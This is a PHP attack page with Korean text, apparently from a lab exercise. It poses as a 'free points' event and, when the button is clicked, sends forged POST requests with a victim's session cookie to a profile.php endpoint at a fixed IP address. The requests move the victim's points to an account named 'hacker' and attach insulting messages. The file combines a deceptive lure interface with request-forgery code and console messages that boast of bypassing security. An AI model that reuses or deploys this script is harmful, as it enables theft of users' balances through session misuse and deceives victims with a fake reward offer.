<?php
session_start();

// 공격 실행 여부 확인
$attack_executed = false;
$attack_results = [];

if ($_POST && isset($_POST['execute_attack'])) {
    $attack_executed = true;
    
    // Bob의 세션으로 공격 실행
    $bob_session = 'PHPSESSID=bob_session_token'; // 실제로는 탈취한 세션 쿠키
    
    $attacks = [
        [
            'points' => 30,
            'gift_type' => 'coffee',
            'message' => '어 개털렸죠?'
        ],
        [
            'points' => 25,
            'gift_type' => 'cake', 
            'message' => '내가 가져간다 이 대머리야'
        ]
    ];
    
    foreach ($attacks as $i => $attack) {
        $attack_results[] = executeCSRFAttack($attack, $i + 1);
        sleep(1); // 1초 간격
    }
}

function executeCSRFAttack($attack, $attackNum) {
    $target_url = 'http://3.35.218.180/profile.php';
    
    $post_data = http_build_query([
        'receiver_id' => '13',
        'points' => $attack['points'],
        'send_gift' => '1',
        'gift_type' => $attack['gift_type'],
        'message' => $attack['message']
    ]);
    
    $context = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/x-www-form-urlencoded\r\n" .
                       "Content-Length: " . strlen($post_data) . "\r\n" .
                       "Cookie: PHPSESSID=victim_session_here\r\n", // 피해자 세션
            'content' => $post_data,
            'timeout' => 10
        ]
    ]);
    
    $response = @file_get_contents($target_url, false, $context);
    
    $result = [
        'attack_num' => $attackNum,
        'points' => $attack['points'],
        'success' => false,
        'response_preview' => '',
        'http_code' => 'Unknown'
    ];
    
    if ($response !== false) {
        $result['success'] = (strpos($response, '선물') !== false || 
                             strpos($response, '전송') !== false ||
                             strpos($response, '<!DOCTYPE html>') !== false);
        $result['response_preview'] = substr($response, 0, 200);
        $result['http_code'] = '200';
    }
    
    return $result;
}
?>

<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 특별 이벤트 - 무료 포인트 지급!</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.18);
            max-width: 600px;
            width: 90%;
        }
        .title { font-size: 2.5em; margin-bottom: 20px; text-shadow: 2px 2px 4px rgba(0,0,0,0.5); }
        .pulse { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .attack-form { background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0; }
        .attack-results { background: rgba(0,0,0,0.3); padding: 20px; border-radius: 10px; margin: 20px 0; text-align: left; }
        .result-item { margin: 10px 0; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; }
        .success { color: #00FF88; }
        .failed { color: #FF6B6B; }
        .btn { background: linear-gradient(45deg, #667eea, #764ba2); color: white; border: none; padding: 15px 30px; border-radius: 25px; font-size: 1.1em; cursor: pointer; transition: all 0.3s; }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="title pulse">🎁 특별 이벤트!</h1>
        <p>무료 포인트 지급 시스템에 연결되었습니다</p>
        
        <?php if (!$attack_executed): ?>
        <div class="attack-form">
            <h3>💰 포인트 지급 준비 완료</h3>
            <p>서버에서 안전하게 포인트를 지급해드립니다</p>
            
            <form method="POST" style="margin: 20px 0;">
                <input type="hidden" name="execute_attack" value="1">
                <button type="submit" class="btn">🚀 무료 포인트 받기</button>
            </form>
            
            <div style="font-size: 0.9em; opacity: 0.8; margin-top: 15px;">
                <p>📋 지급 예정: 55P (30P + 25P)</p>
                <p>🎯 수혜자: hacker (ID: 13)</p>
                <p>⚡ PHP 서버사이드 처리</p>
            </div>
        </div>
        
        <?php else: ?>
        <div class="attack-results">
            <h3 class="pulse success">✅ 포인트 지급 완료!</h3>
            
            <?php 
            $total_success = 0;
            $total_points = 0;
            
            foreach ($attack_results as $result): 
                if ($result['success']) {
                    $total_success++;
                    $total_points += $result['points'];
                }
            ?>
            
            <div class="result-item">
                <div class="<?php echo $result['success'] ? 'success' : 'failed'; ?>">
                    <?php echo $result['success'] ? '✅' : '❌'; ?> 
                    공격 <?php echo $result['attack_num']; ?>: 
                    <?php echo $result['points']; ?>P 
                    <?php echo $result['success'] ? '성공' : '실패'; ?>
                </div>
                <div style="font-size: 0.8em; opacity: 0.7; margin-top: 5px;">
                    HTTP: <?php echo $result['http_code']; ?> | 
                    응답: <?php echo htmlspecialchars(substr($result['response_preview'], 0, 100)); ?>...
                </div>
            </div>
            
            <?php endforeach; ?>
            
            <div style="background: rgba(0,255,136,0.1); padding: 15px; border-radius: 10px; margin-top: 20px;">
                <h4>🎯 최종 결과</h4>
                <p><strong>성공한 공격:</strong> <?php echo $total_success; ?>/<?php echo count($attack_results); ?></p>
                <p><strong>탈취 포인트:</strong> <?php echo $total_points; ?>P</p>
                <p><strong>성공률:</strong> <?php echo round(($total_success/count($attack_results))*100, 1); ?>%</p>
                <p><strong>타겟:</strong> hacker (ID: 13)</p>
            </div>
            
            <div style="margin-top: 20px; font-size: 0.9em;">
                <p>🔍 <strong>결과 확인:</strong></p>
                <p>1. http://3.35.218.180 에 hacker로 로그인</p>
                <p>2. 포인트 <?php echo $total_points; ?>P 증가 확인</p>
                <p>3. bob 계정에서 포인트 감소 확인</p>
            </div>
        </div>
        <?php endif; ?>
    </div>

    <script>
        console.log('🎯 PHP CSRF 공격 페이지 로드 완료');
        console.log('🔧 서버사이드 처리로 보안 정책 우회');
        console.log('📋 타겟: hacker (ID: 13)');
        
        <?php if ($attack_executed): ?>
        console.log('✅ PHP 공격 실행 완료!');
        console.log('📊 성공: <?php echo $total_success; ?>/<?php echo count($attack_results); ?>');
        console.log('💰 포인트: <?php echo $total_points; ?>P');
        console.log('🏴‍☠️ hacker 계정에서 확인해보세요!');
        <?php endif; ?>
    </script>
</body>
</html>
